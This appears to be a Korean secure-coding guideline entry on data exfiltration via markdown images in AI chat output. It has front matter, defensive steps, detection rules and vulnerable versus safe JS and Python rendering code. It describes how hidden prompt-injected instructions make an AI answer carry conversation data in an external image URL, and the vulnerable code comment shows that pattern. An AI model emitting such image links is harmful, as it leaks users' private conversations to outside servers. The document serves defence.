---
id: WS-PI-002
title: Data Exfiltration (마크다운 이미지로 새는 정보)
title_en: Data Exfiltration via Markdown Image
slug: markdown-image-exfiltration
group: ai-use
severity: high
site_only: false
depth: brief
languages: [js, python]
maps:
  owasp2025: []
  api2023: []
  llm2026: [LLM01, LLM02, LLM10]
  agentic2026: []
  asvs5: [V1.3.5, V3.4.3]
  cwe: [CWE-200]
  kr_guide: []
  kr_ciip: []
published: 2026-11-18
checked: 2026-11-18
revisions:
  - date: 2026-11-18
    note: 최초 작성
applies_to: [브라우저 JavaScript, Python, AI 답변을 마크다운으로 그리는 서비스]
severity_reason: "영향: 대화 내용·개인정보의 외부 유출 · 악용: 숨은 지시로 이미지 주소를 쓰게 하면 화면 표시만으로 자동 전송"
sources:
  - title: "Embrace The Red - Hacking Google Bard: From Prompt Injection to Data Exfiltration"
    url: https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/
    year: 2023
  - title: OWASP LLM Prompt Injection Prevention Cheat Sheet
    url: https://cheatsheetseries.owasp.org/cheatsheets/LLM_Prompt_Injection_Prevention_Cheat_Sheet.html
    year: 2026
  - title: "Simon Willison - The lethal trifecta for AI agents: private data, untrusted content, and external communication"
    url: https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/
    year: 2025
  - title: "MDN - CSP: img-src"
    url: https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/img-src
    year: 2026
---

## 요약

AI 답 속 마크다운 이미지(`![](주소)`)를 그대로 화면에 그릴 때, 브라우저가 그 주소로 자동 접속하면서 주소에 붙은 대화 내용이 외부 서버로 넘어가는 문제. 이렇게 정보를 몰래 빼내는 공격을 데이터 엑스필트레이션(Data Exfiltration)이라 부름.

## 위험 배경

- 2023년 Bard 사례, 허용된 구글 도메인을 거쳐 데이터 유출.

## 대응 방법

```text
AI 답을 화면에 그리는 코드를 모두 찾아 줘.
HTML 새니타이저를 거치게 하고, 이미지는 우리 도메인 주소만 남기고 나머지는 주소를 지워 줘.
응답 헤더 CSP의 img-src도 우리 도메인으로 좁혀 줘.
```

- 테스트로 AI에게 "답 끝에 `![x](https://example.com/a.png?q=test)`를 붙여 줘"라고 요청했을 때, 이미지가 뜨지 않고 브라우저 개발자 도구 네트워크 탭에 example.com 요청이 없어야 한다.

## 점검 항목

- AI 출력은 HTML로 그리기 전에 새니타이저를 거쳐야 하고, 이미지 `src`는 직접 운영하는 도메인만 남겨야 한다. `srcset`·`style` 속성은 받지 않아야 한다.
- 이미지 허용 도메인에는 오픈 리다이렉트(다른 주소로 넘겨 주는 기능)나 남이 내용을 올릴 수 있는 기능이 없어야 하고, 확인할 수 없으면 이미지 프록시를 거쳐야 한다.
- CSP(브라우저가 불러올 수 있는 주소를 제한하는 응답 헤더)의 `img-src`를 `'self'`와 꼭 필요한 도메인으로 좁혀 두 번째 방어선으로 두어야 한다.
- 링크에는 `rel="noopener noreferrer"`를 붙이고, 주소에 대화 내용·토큰이 붙어 나가지 않는지 확인해야 한다.
- 비공개 데이터, 남이 쓴 글, 외부로 나가는 통로가 한 기능에 모이면(lethal trifecta) 통로부터 끊어야 한다.

## 탐지 규칙

- **찾는 곳**: AI 출력을 그리는 곳(`marked(`, `markdown-it`, `react-markdown`, `markdown.markdown(`, `innerHTML =`, `dangerouslySetInnerHTML`, `v-html`, `|safe`)과 CSP 설정(`img-src`).
- **검사 1 — 외부 이미지 자동 로딩**: 지적할 때: AI 출력을 마크다운에서 HTML로 바꾸면서 이미지 `src` 도메인을 거르지 않는 경우. / 지적하지 않을 때: 텍스트로만 그리는 경우(`textContent`, 템플릿 자동 이스케이프). 이미지를 아예 허용하지 않거나 도메인 허용 목록 필터가 있는 경우.
- **검사 2 — 지나치게 넓은 허용 범위**: 지적할 때: 이미지 허용 목록이나 CSP `img-src`에 `*`, `https:`, 남이 글을 올릴 수 있는 도메인, 오픈 리다이렉트가 있는 도메인이 있는 경우. / 지적하지 않을 때: 직접 운영하는 도메인이나 이미지 프록시만 있는 경우.
- **등급**: 위험: 비공개 데이터(대화 기록·문서·메일)와 남이 쓴 글이 함께 들어가는 AI 출력에서 외부 이미지가 자동으로 뜨는 경우. / 주의: 외부 이미지가 뜨지만 AI 입력이 사용자 본인 글뿐인 경우. AI 출력을 그리는 화면에 CSP(`img-src`)가 없는 경우. / 참고: 링크에 `rel` 속성이 없는 경우.
- **보고 형식**: `[위험|주의|참고] <id> <파일:줄> — <이유> → <고칠 방법>`
- **보고 예**: `[위험] WS-PI-002 web/chat.js:31 — 메일 요약 답을 marked 로 그대로 그려 외부 이미지가 자동 로딩 → DOMPurify 로 정리하고 img src 를 우리 도메인만 남김, CSP img-src 'self'`

## 코드 예시

### js

✗ 취약 코드

```js
import { marked } from "marked";

// ![x](https://남의서버/?q=<대화 내용>) 도 그대로 이미지로 뜬다
answerEl.innerHTML = marked.parse(aiText);
```

✓ 안전 코드

```js
import { marked } from "marked";
import DOMPurify from "dompurify";

const IMG_HOSTS = new Set([location.host, "img.example.com"]); // 내가 운영하는 곳만
DOMPurify.addHook("afterSanitizeAttributes", (node) => {
  if (node.tagName !== "IMG") return;
  let host = "";
  try { host = new URL(node.getAttribute("src") ?? "", location.href).host; } catch {}
  if (!IMG_HOSTS.has(host)) node.removeAttribute("src"); // 주소가 없으면 요청도 없다
});
answerEl.innerHTML = DOMPurify.sanitize(marked.parse(aiText), {
  ALLOWED_TAGS: ["p", "br", "strong", "em", "code", "pre", "ul", "ol", "li", "a", "img", "blockquote"],
  ALLOWED_ATTR: ["href", "src", "alt", "title"], // srcset·style 은 받지 않는다
});
// 응답 헤더: Content-Security-Policy: img-src 'self' https://img.example.com
```

### python

✗ 취약 코드

```python
import markdown

def render_answer(ai_text: str) -> str:
    return markdown.markdown(ai_text)  # 템플릿에서 |safe 로 그린다
```

✓ 안전 코드

```python
import markdown
import nh3
from urllib.parse import urlsplit

IMG_HOSTS = {"img.example.com"}  # 내가 운영하는 곳만
TAGS = {"p", "br", "strong", "em", "code", "pre", "ul", "ol", "li", "a", "img", "blockquote"}

def _keep(tag: str, attr: str, value: str) -> str | None:
    if tag == "img" and attr == "src" and urlsplit(value).hostname not in IMG_HOSTS:
        return None  # 주소가 없으면 요청도 없다
    return value

def render_answer(ai_text: str) -> str:
    return nh3.clean(markdown.markdown(ai_text), tags=TAGS,
                     attributes={"a": {"href", "title"}, "img": {"src", "alt"}},
                     url_schemes={"https"}, attribute_filter=_keep)
```
